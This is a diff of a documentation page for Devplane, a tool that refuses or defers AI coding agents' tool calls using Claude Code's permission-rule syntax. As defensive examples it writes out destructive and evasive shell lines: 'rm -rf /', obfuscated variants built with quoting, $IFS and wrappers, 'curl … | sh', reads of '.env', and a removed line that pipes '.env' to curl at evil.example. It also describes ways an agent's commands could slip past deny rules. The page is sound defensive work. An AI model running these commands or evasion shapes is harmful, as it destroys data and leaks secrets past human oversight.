@@ -1,22 +1,19 @@
 +++
 title = "Permissions"
-description = "Devplane never approves a tool call. It can refuse one and it can put one in front of you — in Claude Code's own rule syntax, resolved per repository."
+description = "Devplane never approves a tool call. It refuses one (never_auto) or puts one in front of you (always_ask), in Claude Code's rule syntax, per repository — and fails closed when the rules will not load."
 weight = 22
 [extra]
 group = "reference"
 +++
 
-**Devplane never approves a tool call.** Your agent's permission system does that, in its own
-settings, where it is authoritative. Devplane can *prohibit* and it can *defer* — being stricter than
-your agent needs no agreement from it — and it shows you the request and who has to answer.
-
-So there are two lists:
+**Devplane never approves a tool call**; your agent's own permission system does that. Devplane can
+*refuse* a call or *defer* it to a person. There are two lists:
 
 ```toml
 # devplane.toml
 [policy]
 never_auto = [
-  "Bash(rm -rf *)",
+  "Bash(rm *)",
   "Read(.env)",
   "mcp__*",
 ]
@@ -25,201 +22,135 @@ always_ask = [
 ]
 ```
 
-A machine-wide set with the same shape lives in `~/.devplane/policy.toml`. One rule set answers three
-callers: the synchronous permission hook for sessions Devplane only watches, the protocol's
-permission request for runs it drives, and its own effects in the [decision log](/docs/decisions/).
+A machine-wide set with the same shape lives in `~/.devplane/policy.toml`. There is no allow list;
+grants belong in your agent's own `settings.json`, under `permissions.allow`.
 
-> [!IMPORTANT]
-> **There is no allow list.** `never_auto` and `always_ask` are the only two keys `[policy]` has.
-> Devplane refuses and defers; it never approves, because approving would be a claim that your agent
-> would have approved too. Grants belong in your agent's own `settings.json`, under
-> `permissions.allow`; see [Which rule to write next](#which-rule-to-write-next). Any other key under
-> `[policy]` fails the file and names the line.
+The same rules answer a watched session's hooks (no host needed), the permission requests of runs
+Devplane drives, and Devplane's own actions. Every verdict lands in the
+[decision log](@/docs/decisions.md) with the rule named.
+
+Test a rule before you commit it:
+
+```sh
+devplane explain 'pnpm test && rm -rf /'
+devplane explain --tool Read .env
+devplane explain --replay          # every call already observed, against the rules now
+devplane check                     # does devplane.toml parse, and is any rule refused
+```
 
 ## The syntax is Claude Code's
 
-A prohibition moves between `settings.json` and `devplane.toml` by cutting and pasting it. Every row
-below is pinned by a test against the published specification.
+A prohibition moves between `settings.json` and `devplane.toml` by copy and paste. `devplane doctor`
+prints the baseline: rule syntax modelled on Claude Code 2.1.273. What a rule *reaches* is wider
+here, only ever toward a prompt; see
+[Where Devplane is stricter](#where-devplane-is-stricter-than-claude-code).
 
 ### Tools
 
 | You write | It matches |
 |---|---|
-| `Read`, `Bash` | every use of that tool |
-| `Bash(*)` | the same as `Bash` |
-| `mcp__github` | every tool from the `github` MCP server |
-| `mcp__github__*` | the same |
+| `Read`, `Bash`, `Bash(*)` | every use of that tool |
+| `mcp__github`, `mcp__github__*` | every tool from the `github` MCP server |
 | `mcp__github__get_*` | that server's `get_` tools |
 | `mcp__github__create_issue` | one tool |
-| `mcp__*`, `*`, `B*` | a glob over the whole tool name |
+| `mcp__*`, `*` | a glob over the whole tool name |
 
 ### Commands
 
-For `Bash`, `PowerShell` and `Monitor`, the specifier is a command pattern. `*` matches any text,
-including spaces.
-
-`Monitor` runs a command in the background and feeds its output back to the agent, so a `Bash(…)`
-rule governs it as well — `never_auto = ["Bash(rm *)"]` stops the foreground `rm` and the background
-one, and a redirection inside a `Monitor` command is checked like any other.
+For `Bash`, `PowerShell` and `Monitor` the specifier is a command pattern, matched against **tokens,
+not text**. The line is split into simple commands on `&&`, `||`, `;`, `|`, `&` and newlines;
+each is reduced to a program and its arguments, quotes removed the way the shell removes them.
+A rule is a token prefix: the program, then the flags **as a set**, then the operands.
 
 | You write | Matches | Does not match |
 |---|---|---|
 | `Bash(npm run build)` | `npm run build` | `npm run build --watch` |
-| `Bash(npm run *)` | `npm run build`, `npm run test --watch`, **`npm run`** | `npm install` |
+| `Bash(npm run *)` | `npm run build`, `npm run test --watch`, `npm run` | `npm install` |
 | `Bash(npm run:*)` | the same — `:*` is the form the permission dialog writes | |
-| `Bash(ls *)` | `ls -la`, **`ls`** | `lsof` |
-| `Bash(ls*)` | `ls -la`, `lsof` | |
-| `Bash(* --help *)` | `npm --help x` | `npm --help` |
+| `Bash(ls *)` | `ls -la`, `ls` | `lsof` |
+| `Bash(rm *)` | `rm x`, `rm -rf /`, `/bin/rm -rf /`, `RM -rf /`, `r''m -rf /` | `rmdir x` |
+| `Bash(rm -rf /)` | `rm -rf /`, `rm -r -f /`, `rm -fr /` | `rm -rfv /` |
 
-**PowerShell is matched in PowerShell's terms**: command names resolve to their cmdlet and case is
-ignored, so `PowerShell(Remove-Item *)` also stops `rm`, `del`, `ri`, `rd` and `erase`.
+`:*` is recognised only at the end: in `Bash(git:* push)` the colon is literal. A `Bash(…)` rule also
+governs `Monitor`. `devplane check` warns when a rule's second token is a flag cluster; `Bash(rm *)` is
+the robust spelling.
 
-A PowerShell command's *operands* are not read. Path rules reach the file operands of a **Bash**
-command (below); PowerShell's redirection and cmdlet vocabulary is a different language, and a guess
-at it would be confidently wrong rather than absent. So `Read(.env)` stops `Bash(cat .env)` and says
-nothing about `PowerShell(Get-Content .env)` — write a `PowerShell(Get-Content *)` rule for that.
+**PowerShell is read as literal tokens.** `PowerShell(Remove-Item *)` stops `Remove-Item x`; aliases
+such as `rm` or `del` are not resolved, and under a `PowerShell(…)` rule they go to a person.
 
-Two subtleties worth knowing:
+### A prohibition reaches every simple command on the line
 
-- **A trailing ` *` also matches the bare command** — but only when it is the rule's only wildcard.
-  So `Bash(pnpm test *)` covers `pnpm test`, and `Bash(* --help *)` does not cover `npm --help`.
-- **`:*` is recognised only at the end.** In `Bash(git:* push)` the colon is a literal character and
-  the rule matches nothing.
+A `never_auto` rule fires when **any** simple command matches, wherever it sits and however it is
+spelled. `Bash(rm *)` refuses all of these:
 
-#### Compound commands
+| Shape | Example |
+|---|---|
+| a compound line | `ls && rm -rf /` |
+| a subshell, backtick or `sh -c` (four levels deep) | `( cd /x && rm -rf . )`, `` echo `rm -rf /` ``, `sh -c 'rm -rf /'` |
+| a wrapper and its flags | `sudo --user root rm -rf /`, `env -P /bin rm x`, `timeout 30 rm x`, `nohup`, `flock`, `busybox`, `builtin` |
+| a function body or coprocess | `function f { rm -rf /; }`, `coproc rm -rf /` |
+| a brace expansion | `{rm,-rf,/}` |
+| a here-string given to a shell | `bash <<< 'rm -rf /'` |
+| a program named by its path or in another case | `/usr/bin/rm -rf /`, `./rm x`, `RM -rf /` |
+| a globbed program name | `/bin/r? -rf x`, `/bin/r[m] -rf x` — the shell picks the program, so a person is asked |
 
-A `Bash` rule is **not** matched against the whole command line. Like Claude Code, Devplane is aware
-of shell operators — `&&`, `||`, `;`, `|`, `|&`, `&` and newlines — and matches each subcommand
-separately. A prohibition fires when *any* subcommand matches, including one nested in a subshell, a
-command substitution or a control-flow body: `Bash(rm *)` in `never_auto` stops `ls && rm -rf /`,
-`( cd /x && rm -rf . )` and `` echo `rm -rf /` ``.
-
-Before matching, a fixed set of wrappers is stripped — `timeout`, `time`, `nice`, `nohup`, `stdbuf`,
-the builtins `command` and `builtin`, zsh's `noglob`, and bare `xargs` — so `Bash(npm test *)` also
-matches `timeout 30 npm test`. The query form `command -v` is not stripped, and `xargs` with a flag
-is matched as an `xargs` command. A leading environment assignment is looked past whatever the
-variable.
+Quoted text is data: `echo "a; rm -rf x"` is one `echo` and meets no `rm` rule, and a text tool's
+`-e` is a pattern, not a command (`grep -e 'rm -rf' f`).
 
 > [!WARNING]
-> A `Bash` rule matches the text the agent writes, and it is **not a security boundary around the
-> program**. It reads the line; it does not run it. `Bash(rm *)` stops `rm -rf build/`,
-> `sudo rm -rf build/` and `/bin/rm -rf build/`, and it puts `bash -c 'rm -rf build/'` in front of you
-> because it cannot tell. What no matcher can do is follow a program that decides at run time what to
-> execute. For a boundary that does not depend on command text, use a sandbox — this layer is
-> accountability, not containment.
+> A `Bash` rule reads the line; it cannot follow a program that decides at run time what to execute.
+> For containment, use a sandbox.
 
 ### Paths
 
-For `Read` and `Edit`, the specifier is a **gitignore pattern**. `*` stays inside one path segment;
-`**` crosses them. One `Edit(…)` rule covers every built-in tool that writes files and one `Read(…)`
-rule every one that reads them — `Read`, `Grep`, `Glob` and `LSP` included — so two rules cover nine
-tools.
-
-Four anchors, and confusing them is the most common mistake:
+For `Read` and `Edit` the specifier is a **gitignore pattern**: `*` stays inside one segment, `**`
+crosses them. One `Edit(…)` rule covers every built-in tool that writes files, and one `Read(…)`
+rule every one that reads them (`Grep`, `Glob` and `LSP` included). A `Read` deny also blocks writing
+that path with a file tool; it does not reach `NotebookEdit`, which needs an `Edit` deny.
 
 | You write | Anchored at | Example |
 |---|---|---|
 | `//path` | the filesystem root | `Read(//tmp/**)` |
 | `~/path` | your home directory | `Read(~/.ssh/**)` |
-| `/path` | **the file the rule is written in** | `Read(/secrets/**)` in a `devplane.toml` means *that repository's* `secrets` |
-| `path`, `./path` | the directory the agent is working in | `Read(*.env)` |
+| `/path` | the file the rule is written in | `Read(/secrets/**)` in a `devplane.toml` means that repository's `secrets` |
+| `path`, `./path` | the agent's working directory | `Edit(src/**)` |
 
-A **bare filename matches at any depth**, so `Read(.env)` and `Read(**/.env)` are the same rule, and
-a single-segment directory pattern floats the same way: `Read(secrets/**)` catches a vendored copy at
-any depth.
+A bare filename matches at any depth: `Read(.env)` is `Read(**/.env)`. Symlinks are resolved at both
+ends, so a repository shipping `config/key -> ~/.ssh/id_rsa` does not get past `Read(~/.ssh/**)`.
 
-> [!IMPORTANT]
-> `Edit(path)` governs **every built-in tool that edits files**, and `Read(path)` every one that
-> reads them, `LSP` included. A `Read` deny additionally blocks writing to that path *with a file
-> tool*, because "never look at `.env`" plainly also means "never replace it". The one documented
-> exception: a `Read` deny does **not** reach `NotebookEdit`, so a path no tool may change needs an
-> `Edit` deny of its own.
+### Path rules reach shell commands
 
-> [!IMPORTANT]
-> **In a shell command that reach is narrower.** Under `never_auto = ["Read(.env)"]` Claude Code
-> refuses `echo x | tee .env` and runs `echo x > .env` and `touch .env`. A redirection and a bare
-> create are `Edit` business.
+A `Read` or `Edit` rule also governs the files a shell command **names**:
 
-So to protect a file from a shell, write both halves:
+| Command | Reached by |
+|---|---|
+| `cat .env`, `grep TOKEN .env`, `head .env`, `less .env`, `base64 < .env` | `Read` — the operands of known readers, and input redirections |
+| `cp .env /tmp/b`, `mv .env x`, `rm .env` | `Read` — never looking at a file also means never moving or replacing it |
+| `cp /tmp/a .env`, `tee .env`, `touch .env`, `dd of=.env`, `ln -s x .env` | `Edit` and `Read` |
+| `echo x > .env` | `Edit` only — an output redirection is `Edit` business |
+| `grep -r key secrets` | a recursive command reaches everything under its directory |
+| `cat .en?`, `cat conf*` | a glob operand that could expand onto the protected file |
+
+To protect a file from a shell, write both halves (`devplane check` notes when only one is there):
 
 ```toml
 [policy]
 never_auto = ["Read(.env)", "Edit(.env)"]
 ```
 
-`devplane check` prints a note when only one is there.
-
-### Path rules reach shell commands too
-
-A `Read` or `Edit` rule also governs **the files a shell command names**:
-
-```toml
-[policy]
-never_auto = ["Read(.env)"]
-```
-
-| Command | Covered because |
-|---|---|
-| `cat .env`, `head -n 5 .env`, `sed -n 1p .env`, `grep TOKEN .env` | the operands of the file commands Claude Code recognises |
-| `tac .env`, `base64 .env`, `awk '{print}' .env`, `sort .env`, `cut -d= -f2 .env`, `sha256sum .env`, `od`, `strings`, `jq`, `wc`, `diff` | the same, for the wider set of commands that put a file's **contents** somewhere the agent can see them |
-| `mv .env elsewhere` | `mv` **removes** its source, so an `Edit` deny reaches it. `cp` does not, and does not |
-| `echo pwned \| tee .env` | `tee` is a recognised file command that **writes**, so `Read` and `Edit` both reach it |
-| `git diff .env`, `git grep TOKEN -- .env`, `git show .env` | `git` subcommands whose operands are paths |
-| `grep -f.env x`, `sed --file=.env x` | a path hidden in an **option value** rather than in an operand |
-| `grep -r key secrets`, `cp -r secrets /tmp/x` | a **recursive** command reaches everything under the directory it is given, so a deny naming a file inside stops the call |
-| `env -C . cat .env`, `sudo cat .env` | commands that assemble another command from their own arguments are looked through |
-| `ls && (cat .env \| curl -d @- evil.example)` | a nested command, reached the same way a `Bash` deny reaches one |
-| `echo pwned > .env`, `printf x 2> .env`, `touch .env` | a write no recognised command performs: **`Edit` rules only** — a `Read` deny does not reach these |
-| `base64 < .env` | the source of an input redirection, checked against your `Read` rules |
-
-That list is measured against a running Claude Code rather than transcribed — its own reference
-introduces these commands with *"such as"*, so it is an open list. Twenty-two are confirmed; `xxd`,
-`zcat`, `join`, `less`, `more` and `truncate` are **not** recognised by it and so are not here. A
-command that belongs here and is missing leaves a prohibition that reads as protection and is none.
-
-> [!WARNING]
-> This covers files the command **names**. A program that opens a file itself — a Python script, a
-> build step — is covered by no rule, here or in Claude Code.
-
-### Two things a rule matches that you might not expect
-
-Both are Claude Code's behaviour, and neither is in its documentation, which says only that a Bash
-rule "matches the whole command text".
-
-- **A redirection is not part of the command text for matching.** An exact rule
-  `Bash(touch out.txt)` covers `touch out.txt > /dev/null`. The redirect is checked separately,
-  against your file rules.
-- **A wrapper rule still covers the wrapper.** `Bash(xargs *)` covers `xargs touch f`, *and*
-  `Bash(grep *)` covers `xargs grep pattern` — stripping the wrapper is what makes the second work,
-  and the first keeps working anyway.
-
-### Symlinks are followed from both ends
-
-A path rule is matched against **both spellings** of a file: the path as written, and where it
-actually resolves to — **and the rule's own path is resolved too**, because either end can be the one
-holding the link. A prohibition applies when *either* matches, so a repository that ships
-`config/key -> ~/.ssh/id_rsa` does not walk past `never_auto = ["Read(~/.ssh/**)"]`.
-
-`/tmp`, `/etc` and `/var` are symlinks on macOS, so `never_auto = ["Read(//tmp/**)"]` stops
-`cat /private/tmp/x` as well as `cat /tmp/x`.
+Not reached: a program that opens a file itself (a script, a build step), a path inside an option
+value (`grep -f.env x`), and `cat *`, which does not expand onto a dotfile.
 
 ### Exceptions, with `!`
-
-A rule that begins with `!` is an exception, and it is scoped to the file it is written in — so a
-project cannot use one to cancel a machine-wide prohibition:
 
 ```toml
 [policy]
 never_auto = ["Bash(git *)", "!Bash(git status *)"]
 ```
 
-A bare `!` is ignored.
-
-### One rule shape Devplane declines
-
-`Cd(<path>)` rules govern the `/cd` slash command — a person moving the session, not a tool call —
-so nothing ever reaches Devplane to match one. `devplane check` says so rather than letting the rule
-look like protection. Keep it in `settings.json`, where Claude Code evaluates it.
+An exception applies **per simple command, never to the whole line**: in `git status && git push
+--force` the first command is excused and the second is not, so the line is refused. An exception is
+scoped to the file it is written in, so a project cannot cancel a machine-wide prohibition.
 
 ### Hosts and parameters
 
@@ -231,428 +162,148 @@ never_auto = [
 ]
 ```
 
-`domain:` matches the URL's **host**, read out of it rather than found as a substring — so
-`WebFetch(domain:docs.rs)` does not match `https://evil.example/docs.rs`.
+`domain:` matches the URL's parsed host, not a substring. `Tool(param:value)` matches a top-level
+input field, with `*` as a wildcard; a parameter the model omits never matches.
 
-`Tool(param:value)` matches a top-level input field, with `*` as a wildcard. A parameter the model
-omits is never matched.
+## Order: deny wins
 
-## Deny wins, in both directions
+`never_auto` is evaluated first across **both** files, then `always_ask`, then *unresolved* (the line
+hides what it runs, so a person is asked), then *undecided* (no answer; your agent asks as usual).
+Specificity does not change the order, and neither file can cancel the other's prohibitions.
 
-`never_auto` is evaluated first, then `always_ask`, and the first match decides. **Specificity does
-not change that order.**
-
-A project cannot cancel what the machine forbids, and the machine's rules do not cancel a project's.
-Each stage is evaluated across **both** files before the next one begins, so a rule added in one
-place cannot quietly widen a decision written in another.
-
-## A rule belongs to the project it protects
-
-The policy is resolved from the **directory the agent is working in**, with a worktree inheriting the
-rules of the checkout that owns it — both kinds: the `.claude/worktrees/<name>` layout Claude Code
-and Devplane use, and anything `git worktree add` put elsewhere on the disk.
-
-### The rules come from the checkout, the gates come from the branch
-
-This asymmetry is deliberate, and it is the reason an agent cannot widen its own permissions.
-
-An agent works on a branch, in a worktree, and it can edit any file there — including
-`devplane.toml`. So the **permission rules** are read from the checkout that *owns* the worktree,
-which is the copy on your trunk that you reviewed. A rule the agent adds to its own branch changes
-nothing about what it is allowed to do.
-
-The **gates** are read from the worktree, because the definition of done has to travel with the code:
-a branch that adds a test suite should be checked by it. That direction is safe — a gate an agent
-weakens still has to produce a green result that a person then looks at, and every run of it is in
-the decision log.
-
-Each rule set is evaluated against the directory it was **written in**, which is what a single
-leading slash anchors to. The same `Read(/secrets/**)` means one thing in a `devplane.toml` and
-another in `~/.devplane/policy.toml`; use `//` or `~/` for a machine-wide rule that should apply
-inside every project.
+The governing `devplane.toml` is the one at the root of the checkout the command runs in. A worktree
+inherits the rules — and the gates — of the checkout that owns it, so a rule an agent relaxes on its
+own branch changes nothing about what it may do.
 
 ## Rules that cannot work are refused
 
-Claude Code lists the spellings it skips in its own startup dialog, and for a good reason: the
-failure is silent, and on `never_auto` silence reads as permission. `devplane check` and
-`work start` report the same ones **before an agent starts**.
+A `never_auto` rule that silently matches nothing would read as protection. `devplane check` and
+`devplane change start` report these before an agent starts:
 
 | Refused | Why |
 |---|---|
-| `Write(src/**)`, `Glob(src/**)`, `NotebookEdit(x)` | file permissions are only checked against `Read(…)` and `Edit(…)`; these are accepted and never consulted |
+| `Write(src/**)`, `Glob(src/**)`, `NotebookEdit(x)` | file permissions are checked only against `Read(…)` and `Edit(…)`; these are never consulted |
 | `mcp__github(create_issue)` | an `mcp__` rule with brackets is skipped on load |
-| `Bash(command:rm *)` | bypassable by a compound command, so it is ignored; write `Bash(rm *)` |
+| `Bash(command:rm *)` | ignored because a compound command bypasses it; write `Bash(rm *)` |
 | `Agent(researcher)` | that tool has no field for a bare specifier to match |
-| `Bash(rm -rf *` | the bracket was never closed |
+| `Bash(rm -rf *` | the bracket is never closed |
 
-A `!`-prefixed rule is not in that list: in `never_auto` and `always_ask` it **is** an exception and
-is honoured, scoped to the file it was written in — see [Exceptions, with `!`](#exceptions-with).
-
-And one **warning**, because the list behind it is a snapshot of somebody else's tool reference:
+And one **warning**, because the list behind it is a snapshot of Claude Code's tool reference:
 
 | Warned about | Why |
 |---|---|
-| `Bahs(rm *)`, `Stop Task` in `never_auto` or `always_ask` | the tool name is not one Claude Code documents, so the rule matches nothing. A prohibition with a typo in it is a dead prohibition. The name shown in the transcript is not always the one rules use — `Stop Task` is written `TaskStop` |
+| `Bahs(rm *)`, `Stop Task` | not a tool name Claude Code documents, so the rule matches nothing. The name shown in a transcript is not always the rule name — `Stop Task` is written `TaskStop` |
 
-### The release the rule syntax was modelled on
+`Cd(<path>)` rules govern a slash command, not a tool call, so nothing reaches Devplane to match
+one; `devplane check` says so. Keep them in `settings.json`.
 
-Devplane reads `never_auto` and `always_ask` rules in Claude Code's own spelling, so that one rule
-means the same thing in both places. That syntax was read against **Claude Code 2.1.273**, and
-`devplane doctor` says so:
+## Rules that do nothing
+
+`devplane check` also reports a rule that is valid but can never take effect, because an earlier
+rule in the same list already covers every call it names:
 
 ```console
-$ devplane doctor
-gate
-  rule syntax modelled on Claude Code 2.1.273
-  prohibitions are Devplane's own and need no agreement from the agent
+$ devplane check
+  policy    2 deny, 0 ask
+            deny   Bash(rm *)
+            deny   Bash(rm -rf /tmp/build)
+  unused    `Bash(rm -rf /tmp/build)` does nothing: `Bash(rm *)` above it already covers
+            every call it names
 ```
 
-It is a fact with a date, not a warning: Devplane only prohibits and defers, and being **stricter**
-than your agent needs no agreement from it. There is nothing to keep in step.
+It is decided by pattern containment and stays silent when it cannot prove the claim; a list with a
+`!` exception is never analysed. `check` also names allow rules in `.claude/settings.json` that grant
+more than they look like (`Bash(python:*)` approves `python -c` with any code). It writes nothing.
 
-## Where Devplane is stricter than Claude Code, on purpose
+## Where Devplane is stricter than Claude Code
 
-Devplane cannot approve anything — there is no allow list, and no rule here can switch a permission
-check off. So the only direction it can be wrong in is *towards you*, and being stricter than your
-agent costs a prompt rather than a grant. Three places use that.
+Devplane cannot approve, so it can only err toward a prompt:
 
-**It looks through the wrappers that run something else.** `sudo`, `doas`, `exec`, `env`, `watch`,
-`setsid`, `ionice` and `flock` take a command and run it under another user, environment or process
-image. Claude Code treats what follows them as a different command, so `Bash(rm *)` does not cover
-`sudo rm -rf /` there. Here it does.
+- **Wrappers are looked through.** `sudo`, `env`, `exec`, `timeout`, `nohup`, `flock`, `busybox` and
+  the rest run another command, and a shell's `-c` is read as a line. `Bash(rm *)` covers
+  `sudo rm -rf /` here.
+- **The program's name matches through its path, case-folded.** `Bash(rm *)` covers `/bin/rm` and
+  `RM`.
+- **Flags are a set**, even in an exact rule: `Bash(rm -rf /)` meets `rm -r -f /` and `rm -fr /`.
+- **More writers count.** The destination of `cp`, `install`, `rsync` and `ln`, `truncate`'s operand
+  and `dd`'s `of=` are all reached by an `Edit` rule.
+- **An unreadable line is asked about** (next section).
 
-**It matches the program's name as well as its path.** `Bash(rm *)` covers `/bin/rm -rf /`,
-`/usr/bin/rm -rf /` and `./rm -rf /`. Claude Code matches the word as written, so a rule naming `rm`
-does not cover `/bin/rm`.
+## When a line cannot be read, a person is asked
 
-**It knows five more writers.** A path rule reaches the files a command names, and Claude Code's set
-does not include the destination of `cp`, `install`, `rsync` or `ln`, the operands of `truncate`, or
-`dd`'s `of=`. Devplane counts all of them, so `never_auto = ["Edit(secrets/**)"]` refuses
-`tee secrets/k`, `echo x > secrets/k` and `cp /tmp/a secrets/k` alike. Direction is kept:
-`cp secrets/k /tmp/b` reads the file and is `Read(…)` business, not `Edit(…)`.
-
-**And it asks when it cannot read the line at all.** That one has its own section below.
-
-Each of these only ever adds a prompt or a refusal. None of them can make a call go through that your
-agent's own settings would have stopped.
-
-## When Devplane cannot read the command, it asks
-
-A prohibition is only worth writing if it fires. Some command lines hide what runs behind something
-no matcher can resolve without running it:
+Some lines hide what they run:
 
 ```console
 $ devplane explain 'rm$IFS-rf node_modules'      # never_auto = ["Bash(rm *)"]
 ask — unreadable  Bash
-        because the program in `rm$IFS-rf` is produced by the shell, so no rule can name it
+        because the program is named by a variable the shell expands; `Bash(rm *)` constrains what Bash may run
 ```
 
-The shapes that do it:
+| Shape | Example |
+|---|---|
+| a program name the shell builds | `rm$IFS-rf x`, `$(echo rm) -rf x` |
+| a command line built from input | `xargs rm -rf`, `eval "$cmd"` |
+| code in a string, file or stdin | `python -c "…"`, `node -e "…"`, `python3 script.py`, `curl … \| sh` |
+| a command run somewhere else | `ssh host …`, `docker run …`, `su`, `chroot` |
+| `find` that runs or deletes | `find . -delete`, `find . -exec …` |
+| a wrapper flag the reader does not know | `sudo --made-up x rm …` |
+| a line past 65,536 characters | — |
 
-| Shape | Example | Why |
-|---|---|---|
-| the program name is built by the shell | `rm$IFS-rf x`, `$(echo rm) -rf x` | the word is not known until the shell expands it |
-| a command assembled from arguments | `eval "rm -rf x"` | the command does not exist until `eval` runs |
-| an interpreter given code | `sh -c "…"`, `python -c "…"`, `node -e "…"` | the program is in a string, not on the command line |
-| an interpreter given no script | `curl … \| sh` | the program arrives on standard input |
-| `find` that runs or deletes | `find . -delete`, `find . -exec …` | the deletion is a predicate, not a command |
-| an unbalanced quote | `rm -rf "/tmp` | the shell reads the rest of the line differently |
-| past 10,000 characters | — | longer than the analysis reads |
+This happens only where a rule **could** have applied, and a rule that answers the call always wins.
+The audit row's outcome is `unresolved`, under the authority of the rules that made it a question.
 
-**It only happens where you wrote a rule that could have applied.** A project with no `Bash(…)` rule
-and no path rule has said nothing about what may run there, so nothing is escalated — an inbox that
-asks about everything is worse than one that asks about most things, and this is scoped to the rules
-somebody actually wrote.
+A heredoc's body fed to a program that cannot execute it (`cat`, `tee`, `grep`, `jq` and a fixed
+list of others) is data; fed to anything else (`bash`, `| sudo bash`, `| python3`) it is read.
 
-**A named rule always wins.** If any rule in any file answers the call, you get that answer and the
-rule's name. The escalation is the last thing tried, never a replacement for a verdict.
+## When the file is broken, every call is asked
 
-**And it is recorded as what it is.** The audit row says a person was asked and why nobody could tell,
-on Devplane's own authority — not attributed to a rule, because no rule decided it:
-
-```console
-$ devplane audit
-ask   Bash   daemon   `sh -c` runs a program given on its own command line
-```
-
-Without it, a command that hides what it runs — `$(echo rm) -rf /` under
-`never_auto = ["Bash(rm *)"]` — would produce no answer and no row, and nothing anywhere would say the
-prohibition had not been consulted.
-
-## One thing rules cannot see
-
-Claude Code runs a built-in set of commands — `ls`, `cat`, `echo`, `pwd`, `head`, `tail`, `grep`,
-`find`, `wc`, `which`, `diff`, `stat`, `du`, `cd` and read-only forms of `git` — **without any
-permission check**, in every mode. A `never_auto` or `always_ask` rule *does* still apply, and is the
-only way to put one of them back in front of a person.
-
-## Rules that do nothing
-
-`devplane check` reports a rule that provably cannot matter, which is a different thing from a rule
-that is malformed:
+A `devplane.toml` that will not load **fails closed**: every gated call in that repository goes to a
+person, naming the file and the parser's error. A broken `~/.devplane/policy.toml` does the same
+machine-wide. A critical inbox item names the file until it loads.
 
 ```console
-$ devplane check
-  policy    3 deny, 0 ask, 0 inert
-            deny   Read(*.env)
-            deny   Bash(rm *)
-            deny   Bash(rm -rf /tmp/build)
-
-  unused    `Bash(rm -rf /tmp/build)` can never take effect: `Bash(rm *)` is
-            consulted first and answers every call it speaks for
-```
-
-This is answered by pattern containment — *does every call this rule speaks for also reach that one*
-— rather than by comparing the text, so `Read(.env)` is reported as covered by `Read(*.env)`.
-
-**It stays quiet when it cannot prove the claim.** A list containing a `!` exception, two rules on
-different tools, a shape the analysis does not handle — all produce nothing. Reporting a rule as
-unused invites you to delete it, so the only mistake this is allowed to make is silence.
-
-`devplane trust` prints the same findings for a repository's own `devplane.toml` before you let an
-agent loose in it.
-
-### And rules in *your agent's* allow list that grant nothing
-
-The section above is about Devplane's own rules. `devplane check` also reads
-`.claude/settings.json` and reports allow rules that **approve nothing at all** — which is worth
-knowing, because a rule that reads as permission and grants none costs you trust rather than safety,
-and nothing else tells you:
-
-```console
-$ devplane check
-  overbroad Bash(python:*)
-            `python` runs whatever follows `-c`, so this approves `python -c
-            '…'` — any code at all. Claude Code reads it the same way
-            narrow it, e.g. Bash(python <the subcommand you mean> *)
-
-  grants no `!Bash(rm *)` is a negation in an allow list, and Claude Code
-            reads `!` only in a deny or ask list, where it carves an
-            exception. An allow list is already the list of exceptions — write
-            the narrower rule instead
-  grants no `mcp__*` is an unanchored wildcard in an allow list, which
-            approves nothing — a tool-name glob is a deny-side pattern. An
-            allow glob is only read after a literal `mcp__<server>__` prefix
-```
-
-The two are halves of one question: `overbroad` is a rule that grants **more** than it looks like,
-`grants no` is one that grants **nothing** while reading as permission.
-
-**Devplane reports and changes nothing.** These are your rules in your agent's file; Devplane does
-not enforce them and does not write to that file. A rule whose specifier does not close — `Bash(ls`
-— is skipped entirely, because your agent already says so at startup and two tools complaining about
-one typo is worse than one.
-
-## Globs in a command
-
-The shell expands a wildcard before the program sees it, so a deny rule asks of an operand carrying
-one: *could this expand onto something I protect?*
-
-```console
-$ devplane explain 'cat .en?'      # never_auto = ["Read(.env)"]
-deny  Bash
-        by Read(.env)
-```
-
-**The rule may carry a wildcard too, and then the question is whether the two can meet.** Neither
-`Read(*.env)` nor `cat conf*` matches the other as text, and `conf.env` satisfies both — so the rule
-fires.
-
-A wildcard still cannot reach a dotfile, exactly as your shell will not: POSIX expands `*` onto a
-name beginning with `.` only when the pattern spells the dot. `cat *` is not a way to read `.env`.
-
-## Quoting does not get past a deny
-
-A shell removes quotes before it decides which program to run, so `r''m -rf /` runs `rm`. A rule is
-matched against the command as written **and** against the command with its quoting removed:
-
-```console
-$ devplane explain "r''m -rf /tmp/x"    # never_auto = ["Bash(rm *)"]
-deny  Bash
-        by Bash(rm *)
-```
-
-The same applies to operands: `cat '.env'`, `cat .e''nv` and `cat .en\v` are all refused by
-`Read(.env)`.
-
-What quoting cannot do, *expansion* still can: `$IFS`, `$(echo rm)` and a backtick name a program
-that is only chosen when the shell runs, and nothing here guesses what it will be.
-
-## Commands too long or too tangled to read
-
-Every analysis has a bound: the number of files one command may name, how deep a substitution is
-followed, and Claude Code's own limit of 10,000 characters past which it *"always prompts"*.
-
-Reaching a bound is reported rather than ignored. The operands past it were never read, so no rule can
-speak for them and the call goes to you with the reason:
-
-```console
-$ devplane explain 'cat f1 f2 … f600 .env'   # never_auto = ["Read(.env)"]
+$ devplane explain 'cat .env'
 ask — unreadable  Bash
-        because it names more files than the command analysis reads, so the rest were not looked at
+        because devplane.toml is not valid: … unknown field `polcy` …; until it loads, a person decides every call
 ```
 
-That is an escalation, not a refusal: nobody looked, so nothing was decided. It closes the
-alternative — a prohibition that silently stops applying once the command is long enough — and it
-costs a prompt on a command nobody writes by hand.
+## Auto mode
 
-**A heredoc's payload is not counted.** `cat > notes.md <<EOF` followed by fifteen kilobytes of
-Markdown is a two-word command with a large payload, not a long command; bytes on another program's
-standard input are not shell.
+Claude Code's auto mode approves routine calls with a classifier and never shows a prompt, so a
+`PermissionRequest` hook never fires there. `devplane connect claude` installs two synchronous hooks:
 
-**A body anything on the line can run is still read, and the test is an allowlist.** The body is
-dropped only when every program on the line is one that provably cannot execute it — `cat`, `tee`,
-`grep`, `jq`, `sort` and the rest of a written-down set. Anything else keeps it: `bash <<EOF`,
-`cat <<EOF | sh`, and equally `cat <<EOF | sudo bash`, `| env bash`, `| timeout 5 sh`,
-`| xargs sh -c`, `| python3`, `| node` — and anything nobody has thought of yet.
+| Hook | Fires | Carries |
+|---|---|---|
+| `PreToolUse` | before every tool call, in every mode | a prohibition, or nothing |
+| `PermissionRequest` | when a person was going to be asked | the same, plus the request to show you |
 
-**The direction of the test is the point.** A list of ways to reach an interpreter is open — through a
-wrapper, an absolute path, a language runtime, something nobody has published yet — and a list of
-programs that cannot be one is closed. So the check asks the closed question: an unrecognised program
-keeps the body, which costs a parse and never a missed rule.
